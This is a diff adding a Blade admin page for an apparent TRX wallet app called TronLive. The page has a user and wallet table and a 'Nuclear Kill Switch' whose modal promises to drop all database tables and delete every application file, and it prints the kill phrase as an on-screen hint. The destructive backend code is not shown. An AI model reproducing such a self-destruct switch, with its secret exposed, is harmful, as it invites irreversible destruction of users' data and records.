+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Admin Balance Card -->
+                <div class="bg-white rounded-lg p-6 border border-gray-300 shadow-sm">
+                    <div class="flex items-center">
+                        <div class="w-12 h-12 bg-yellow-600 rounded-lg flex items-center justify-center">
+                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1"></path>
+                            </svg>
+                        </div>
+                        <div class="ml-4">
+                            <p class="text-gray-600 text-sm">Admin Balance</p>
+                            <p class="text-gray-900 text-2xl font-bold"><span id="vault-admin-balance">***</span> TRX</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- EXTREMELY DANGEROUS: Nuclear Kill Switch Section -->
+            <div class="bg-red-50 border-2 border-red-200 rounded-lg p-6 mb-8">
+                <div class="flex items-center mb-4">
+                    <div class="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center mr-3">
+                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-bold text-red-800">NUCLEAR KILL SWITCH</h3>
+                        <p class="text-red-600 text-sm">EXTREMELY DANGEROUS - DESTROYS EVERYTHING</p>
+                    </div>
+                </div>
+                
+                <div class="bg-red-100 border border-red-300 rounded-lg p-4 mb-4">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <svg class="h-5 w-5 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                            </svg>
+                        </div>
+                        <div class="ml-3">
+                            <h3 class="text-sm font-medium text-red-800">WARNING</h3>
+                            <div class="mt-2 text-sm text-red-700">
+                                <ul class="list-disc pl-5 space-y-1">
+                                    <li>This will <strong>PERMANENTLY DELETE</strong> the entire database</li>
+                                    <li>This will <strong>DESTROY ALL FILES</strong> in the application</li>
+                                    <li>This action is <strong>100% IRREVERSIBLE</strong></li>
+                                    <li>All user data, wallets, and transactions will be <strong>LOST FOREVER</strong></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button onclick="showKillSwitchModal()" 
+                        class="bg-red-600 hover:bg-red-700 text-white px-6 py-3 rounded-lg font-bold transition-colors flex items-center">
+                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                    </svg>
+                    ACTIVATE NUCLEAR KILL SWITCH
+                </button>
+            </div>
+
+            <!-- User Data Table Section -->
+            <div class="bg-white rounded-lg border border-gray-300 shadow-sm">
+                <div class="p-6 border-b border-gray-300">
+                    <h2 class="text-xl font-bold text-gray-900 flex items-center">
+                        <svg class="w-6 h-6 mr-2 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path>
+                        </svg>
+                        User Information & Wallets
+                    </h2>
+                    <p class="text-gray-600 text-sm mt-1">Search and view user details</p>
+                    
+                    <!-- Search Bar -->
+                    <div class="mt-4">
+                        <div class="relative">
+                            <input type="text" id="user-search" placeholder="Search by phone number or email..." 
+                                   class="w-full px-4 py-2 pl-10 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
+                                   oninput="filterUsers()">
+                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Table -->
+                <div class="overflow-x-auto">
+                    <table class="min-w-full divide-y divide-gray-200">
+                        <thead class="bg-gray-50">
+                            <tr>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">User ID</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Name</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Email</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Phone</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Wallet Address</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Balance</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Withdrawn</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="vault-users-table" class="bg-white divide-y divide-gray-200">
+                            <!-- User rows will be loaded here -->
+                        </tbody>
+                    </table>
+                </div>
+                
+                <!-- Pagination Controls -->
+                <div id="vault-pagination" class="bg-gray-50 px-4 py-3 border-t border-gray-200 sm:px-6">
+                    <div class="flex items-center justify-between">
+                        <div class="flex-1 flex justify-between sm:hidden">
+                            <!-- Mobile pagination -->
+                            <button id="vault-prev-mobile" onclick="loadPreviousPage()" class="relative inline-flex items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
+                                Previous
+                            </button>
+                            <button id="vault-next-mobile" onclick="loadNextPage()" class="ml-3 relative inline-flex items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
+                                Next
+                            </button>
+                        </div>
+                        <div class="hidden sm:flex-1 sm:flex sm:items-center sm:justify-between">
+                            <div>
+                                <p class="text-sm text-gray-700" id="vault-pagination-info">
+                                    <!-- Pagination info will be inserted here -->
+                                </p>
+                            </div>
+                            <div>
+                                <nav class="relative z-0 inline-flex rounded-md shadow-sm -space-x-px" aria-label="Pagination">
+                                    <button id="vault-prev-desktop" onclick="loadPreviousPage()" class="relative inline-flex items-center px-2 py-2 rounded-l-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
+                                        <span class="sr-only">Previous</span>
+                                        <svg class="h-5 w-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                                            <path fill-rule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clip-rule="evenodd" />
+                                        </svg>
+                                    </button>
+                                    <span id="vault-page-numbers" class="relative inline-flex items-center px-4 py-2 border border-gray-300 bg-white text-sm font-medium text-gray-700">
+                                        <!-- Page numbers will be inserted here -->
+                                    </span>
+                                    <button id="vault-next-desktop" onclick="loadNextPage()" class="relative inline-flex items-center px-2 py-2 rounded-r-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
+                                        <span class="sr-only">Next</span>
+                                        <svg class="h-5 w-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                                            <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
+                                        </svg>
+                                    </button>
+                                </nav>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- EXTREMELY DANGEROUS: Kill Switch Modal -->
+<div id="kill-switch-modal" class="hidden fixed inset-0 bg-black bg-opacity-75 z-[60] flex items-center justify-center p-4">
+    <div class="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
+        <div class="bg-red-600 text-white p-6 rounded-t-lg">
+            <div class="flex items-center">
+                <div class="w-10 h-10 bg-white bg-opacity-20 rounded-full flex items-center justify-center mr-4">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                    </svg>
+                </div>
+                <div>
+                    <h2 class="text-2xl font-bold">NUCLEAR KILL SWITCH</h2>
+                    <p class="text-red-100">COMPLETE APPLICATION DESTRUCTION</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="p-6">
+            <div class="bg-red-50 border-2 border-red-200 rounded-lg p-4 mb-6">
+                <div class="flex">
+                    <div class="flex-shrink-0">
+                        <svg class="h-6 w-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                        </svg>
+                    </div>
+                    <div class="ml-3">
+                        <h3 class="text-lg font-medium text-red-800">FINAL WARNING</h3>
+                        <div class="mt-2 text-sm text-red-700">
+                            <p class="font-bold mb-2">This action will PERMANENTLY and IRREVERSIBLY:</p>
+                            <ul class="list-disc pl-5 space-y-1">
+                                <li><strong>DROP ALL DATABASE TABLES</strong> - All user data, wallets, transactions DELETED</li>
+                                <li><strong>DELETE ALL APPLICATION FILES</strong> - Complete codebase destruction</li>
+                                <li><strong>DESTROY THE ENTIRE PROJECT</strong> - No recovery possible</li>
+                                <li><strong>CLEAR ALL CACHES</strong> - All stored data wiped</li>
+                            </ul>
+                            <p class="font-bold mt-3 text-red-800">THERE IS NO UNDO. EVERYTHING WILL BE LOST FOREVER.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">
+                        Kill Switch Phrase (Required)
+                    </label>
+                    <input type="text" id="kill-phrase-input" 
+                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent font-mono"
+                           placeholder="Enter the nuclear kill phrase...">
+                    <p class="text-xs text-gray-500 mt-1">Hint: NUCLEAR_OPTION_DESTROY_EVERYTHING_NOW_666</p>
+                </div>
+                
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">
+                        Final Confirmation (Required)
+                    </label>
+                    <input type="text" id="kill-confirmation-input" 
+                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent font-mono"
+                           placeholder="Type the confirmation phrase...">
+                    <p class="text-xs text-gray-500 mt-1">Type: YES_DESTROY_EVERYTHING_I_UNDERSTAND_THIS_IS_IRREVERSIBLE</p>
+                </div>
+                
+                <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <svg class="h-5 w-5 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                            </svg>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-sm text-yellow-800">
+                                <strong>Last chance to reconsider:</strong> This will destroy the entire TronLive application, all user accounts, all wallet data, all transactions, and all files. The application will cease to exist.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="flex justify-between mt-8">
+                <button onclick="hideKillSwitchModal()" 
+                        class="px-6 py-3 bg-gray-300 text-gray-700 rounded-lg hover:bg-gray-400 transition-colors">
+                    Cancel (Safe Choice)
+                </button>
+                <button onclick="executeKillSwitch()" 
+                        class="px-8 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors font-bold flex items-center">
+                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                    </svg>
+                    EXECUTE NUCLEAR DESTRUCTION
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
 
 @endsection
